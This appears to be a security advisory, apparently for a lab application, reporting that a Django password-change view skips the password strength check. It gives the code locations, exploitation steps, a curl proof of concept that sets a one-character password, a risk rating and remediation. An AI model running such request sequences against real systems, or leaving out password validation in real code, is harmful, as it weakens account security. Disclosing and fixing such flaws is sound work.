# Description

Weak password requirements (CWE-521) in the password-change flow of `POST /account/settings/`. The password strength policy is enforced at registration and password reset, but the `settings()` view's password-change branch calls `target_user.set_password(new)` directly without validating the new password. An authenticated user can therefore replace a strong password with a one-character password such as `a`.

**Vulnerable code path**

- `Account/views.py:425-444`: the `if 'old_password' in request.POST:` branch of `settings()`. The only checks are that `new == confirm` (line 436) and that the old password is correct (line 438). There is no strength check.
- `Account/views.py:441-442`: `target_user.set_password(new)` followed by `target_user.save()`. This is where the unchecked password is written.

**Where the strength check IS called**

- `Account/views.py:220-221` (`register()`, signup): `if check_password_strength(password) is not True:` rejects weak passwords with "Password is not strong enough."
- `Account/views.py:170-173` (`password_reset()`, reset-by-token): `if check_password_strength(pw1) is not True:` rejects weak passwords with "Password not strong enough."

**Where the strength check is NOT called**

- `Account/views.py:441` (`settings()`, password change): `set_password()` is called with no call to `check_password_strength()`.

**The policy function**

`Account/Utils/Register.py:24-29` defines `check_password_strength(password)`. It requires at least 8 characters, at least one uppercase letter, one lowercase letter, one digit, and one character from `.!@#$%^&*()_+{}|:"<>?\`~`. It returns `False` otherwise.

**Inconsistency**

The same account can hold a password that would be rejected by the signup and reset flows. Django's `AUTH_PASSWORD_VALIDATORS` (`djangoWocshack_5/settings/base.py:112-117`) is configured, but `set_password()` does not run those validators. Django's password validators are not automatically enforced by `set_password()`. Custom password-setting workflows must explicitly call `validate_password()` or use Django's built-in password validation forms. The policy is therefore enforced on two of the three paths that set a password, and bypassed on the third. An attacker who is logged in can use the bypass to weaken their own account, which makes the account easier to brute-force.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Log in as a normal user (for example `johndoe`) with a password that meets the policy. | Authenticated session. |
| 2 | Open `/account/settings/` and load the CSRF token from the page. | The form includes `csrfmiddlewaretoken`. |
| 3 | POST the password-change form with `old_password` set to the current password and `new_password` = `confirm_password` = `a`. | Server returns HTTP 302 to `/account/settings/` and queues the message "Password updated successfully." No strength check runs. Because `update_session_auth_hash()` is called with the stale `request.user` instead of `target_user`, the current session is invalidated: the next request is redirected to `/account/login/?next=/account/settings/`. |
| 4 | Log in again as the same user with `username=johndoe` and `password=a`. | Login succeeds (HTTP 302 to `/account/process/`). The account now has a one-character password. |

# PoC

```bash
BASE=http://<TARGET>
USER=johndoe
OLD='<current strong password>'

# 1. Log in and keep the session cookie
curl -s -c jar.txt -b jar.txt "$BASE/account/login/" -o /dev/null
CSRF=$(curl -s -c jar.txt -b jar.txt "$BASE/account/login/" | grep -oP 'csrfmiddlewaretoken" value="\K[^"]+' | head -1)
curl -s -c jar.txt -b jar.txt -X POST "$BASE/account/login/" \
  -H "Referer: $BASE/account/login/" \
  --data-urlencode "csrfmiddlewaretoken=$CSRF" \
  --data-urlencode "username=$USER" \
  --data-urlencode "password=$OLD" -o /dev/null

# 2. Get a CSRF token from the settings page
CSRF=$(curl -s -c jar.txt -b jar.txt "$BASE/account/settings/" | grep -oP 'csrfmiddlewaretoken" value="\K[^"]+' | head -1)

# 3. Change the password to "a" (no strength check)
curl -s -c jar.txt -b jar.txt -X POST "$BASE/account/settings/" \
  -H "Referer: $BASE/account/settings/" \
  --data-urlencode "csrfmiddlewaretoken=$CSRF" \
  --data-urlencode "old_password=$OLD" \
  --data-urlencode "new_password=a" \
  --data-urlencode "confirm_password=a" \
  -o /dev/null -w "%{http_code} %{redirect_url}\n"
# -> 302 .../account/settings/ (password changed; this session is now invalidated)

# 4. Verify: log in with the one-character password
curl -s -D - -o /dev/null -b j2.txt -c j2.txt -X POST "$BASE/account/login/" \
  -H "Referer: $BASE/account/login/" \
  --data-urlencode "csrfmiddlewaretoken=$(curl -s -c j2.txt -b j2.txt $BASE/account/login/ | grep -oP 'csrfmiddlewaretoken" value="\K[^"]+' | head -1)" \
  --data-urlencode "username=$USER" \
  --data-urlencode "password=a" | grep -i '^HTTP\|^Location'
# -> HTTP/1.1 302 Found, Location: /account/process/  (login succeeded with "a")
```

The same request sent to `/account/register/` with a weak password returns the error "Password is not strong enough." The contrast shows the policy is applied in one place and not in the other.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | None directly. A weak password makes the account easier to guess, which can lead to access to that account's data. |
| Integrity | A user can silently downgrade their own password to one character. Any policy the platform communicates to users is no longer true for that account. |
| Availability | None directly. |

Overall severity: **Medium** — the flaw needs an authenticated session and only weakens the attacker's own account, so there is no direct cross-user impact. It does make later brute-force, phishing reuse, and password-guessing attacks against that account much easier, and it undermines the signup policy. CVSS 3.1 `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N` (4.3).

# Remediation

1. **Enforce password validation during password changes** — update the password-change branch of `settings()` in `Account/views.py` to call `django.contrib.auth.password_validation.validate_password(new, user=target_user)` before `set_password()`. Catch `django.core.exceptions.ValidationError`, return the validation errors and prevent any password update if validation fails.
2. **Centralise password requirements** — use the existing `AUTH_PASSWORD_VALIDATORS` configuration in `djangoWocshack_5/settings/base.py` as the single source of truth. Integrate or replace `check_password_strength()` in `Account/Utils/Register.py` to eliminate inconsistent password policies.
3. **Apply validation consistently** — ensure that `register()`, `password_reset()` and `settings()` use the same server-side password validation mechanism. Prefer Django's built-in `PasswordChangeForm` where compatible with the existing settings workflow.
4. **Strengthen the existing password policy** — review `MinimumLengthValidator` and configure its `OPTIONS.min_length` according to NIST SP 800-63B-4 recommendations. Maintain an appropriate blocklist of common and compromised passwords rather than relying on mandatory character composition rules.
5. **Preserve authentication and session security** — retain current-password verification, password confirmation and CSRF protection. Use `update_session_auth_hash()` after a successful password change if the current authenticated session must remain active.
6. **Add regression tests** — extend `Account/tests.py` to verify consistent password validation across registration, password reset and password change. Ensure that rejected passwords do not modify stored credentials and that valid passwords are accepted.

# Author
WOCSA
